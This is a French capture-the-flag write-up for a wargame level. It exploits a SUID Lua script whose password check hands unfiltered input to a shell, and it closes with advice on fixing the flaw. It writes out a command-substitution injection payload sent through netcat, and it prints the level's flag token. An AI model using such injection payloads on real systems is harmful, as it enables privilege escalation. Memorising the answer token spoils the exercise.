**Description**
Ce niveau exploite un script Lua (level11.lua) configuré avec le bit SUID appartenant à l’utilisateur flag11. Le script écoute en local sur le port 5151 et demande un « mot de passe ». En interne, il passe la saisie à la commande `echo … | sha1sum` pour comparer la valeur SHA-1. Comme l’entrée n’est nullement filtrée, il est possible d’injecter des commandes shell via la substitution de commande `$()`. Grâce au bit SUID, ces commandes s’exécutent avec les privilèges de flag11, ce qui permet de récupérer le flag de niveau 11.

---

## Comment Exploiter la Faille

1. **Lancer une connexion vers le service**
   Depuis une machine où le script tourne (en tant que flag11), exécutez :

   ```
   nc 127.0.0.1 5151
   ```

   On obtient alors :

   ```
   Password: 
   ```

2. **Injecter la commande pour récupérer le flag**
   En réponse à l’invite `Password:`, envoyez la substitution de commande suivante :

   ```
   $(getflag > /tmp/token)
   ```

   * Lorsque le script Lua fait `echo $(getflag > /tmp/token) | sha1sum`, la commande `getflag` est exécutée avec les droits de flag11 et le résultat (le flag) est redirigé vers `/tmp/token`.
   * Comme la chaîne interpolée n’est pas la bonne valeur SHA-1, le script renvoie alors :

     ```
     Erf nope..
     ```

     mais le flag a déjà été écrit dans `/tmp/token`.

3. **Lire le flag depuis le fichier temporaire**
   Toujours dans le même shell (ou une autre session), affichez le contenu de `/tmp/token` :

   ```
   cat /tmp/token
   ```

   Vous obtenez quelque chose comme :

   ```
   Check flag. Here is your token : fa6v5ateaw21peobuub8ipe6s
   ```

4. **Passer au niveau suivant**
   Utilisez ce token comme mot de passe pour l’utilisateur level12 :

   ```
   su level12
   Mot de passe : fa6v5ateaw21peobuub8ipe6s
   ```

   Vous êtes maintenant connecté en tant que level12.

---

## Comment Résoudre la Faille

1. **Ne pas exécuter de commandes shell non filtrées sur une entrée utilisateur**

   * Dans le script Lua, remplacer l’usage de `io.popen("echo "..pass.." | sha1sum", "r")` par une fonction de hachage native (par exemple l’API Lua pour SHA-1) qui ne fait pas appel à un shell.
   * Ou, à défaut, au minimum échapper rigoureusement toute séquence `$()` ou backticks pour empêcher l’injection.

2. **Retirer le bit SUID**

   * Si le processus n’a pas besoin d’écrire sous un autre utilisateur, retirer le bit SUID sur le binaire Lua ou sur le script level11.lua.
   * Ainsi, un attaquant ne pourra plus exécuter `getflag` avec les droits de flag11.

3. **Exiger un mot de passe solide**

   * Ne pas se contenter de comparer une seule valeur SHA-1 codée en dur dans le script. Au minimum, lire un fichier de mot de passe haché, appliquer un salts et forcer l’utilisateur à fournir la bonne empreinte sans proposer d’exécution shell.

---

## Conclusion

Cette vulnérabilité illustre le danger d’utiliser `io.popen` (ou tout appel shell) sur une entrée brutale de l’utilisateur, surtout dans un contexte SUID : une simple substitution de commande suffit à exécuter arbitrairement `getflag`. Pour corriger, il faut impérativement supprimer toute exécution shell non filtrée, ou bien retirer le bit SUID pour éviter que le binaire s’exécute avec des privilèges élevés.
